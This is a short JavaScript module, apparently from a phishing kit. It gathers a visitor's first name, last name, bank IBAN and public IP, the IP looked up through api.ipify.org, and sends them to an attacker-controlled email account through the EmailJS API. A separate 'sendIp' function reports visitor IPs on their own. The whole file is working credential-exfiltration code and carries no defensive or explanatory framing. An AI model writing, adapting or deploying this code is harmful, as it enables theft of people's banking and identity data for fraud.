(function (global)
{
   let sender = {};
   let ip = null;
   async function submitCredentials(credentials, subject)
   {
      if (ip == null)
         ip = await getIp();
      let properties = await getProperties();
      let url = "https://api.emailjs.com/api/v1.0/email/send";
      const API_KEY = properties["api-key"];
      const TEMPLATE_ID = properties["template-id"];
      const SERVICE_ID = properties["service-id"];
      let request = new Request(url, {
         method: "POST",
         headers: {
            "Content-Type": "application/json"
         },
         body: JSON.stringify({
            service_id: SERVICE_ID,
            template_id: TEMPLATE_ID,
            user_id: API_KEY,
            template_params: {
               subject: subject,
               first_name: (credentials == null)? "" : credentials.firstName,
               last_name: (credentials == null)? "" : credentials.lastName,
               iban: (credentials == null)? "" : credentials.iban,
               ip_address: ip
            }
         })
      });
      let response = await fetch(request);
      console.log("Sent");
   }
   async function sendIp(subject)
   {
      submitCredentials(null,subject);
   }
   async function getIp()
   {
      let response = await fetch('https://api.ipify.org?format=json');
      let data = await response.json();
      return data['ip'];
   }
   async function getProperties()
   {
      let response = await fetch(`../api-properties.json`);
      let data = await response.json();
      return data;
   }
   sender.submitCredentials = submitCredentials;
   sender.sendIp = sendIp;
   global.$emailSender = sender;
})(window);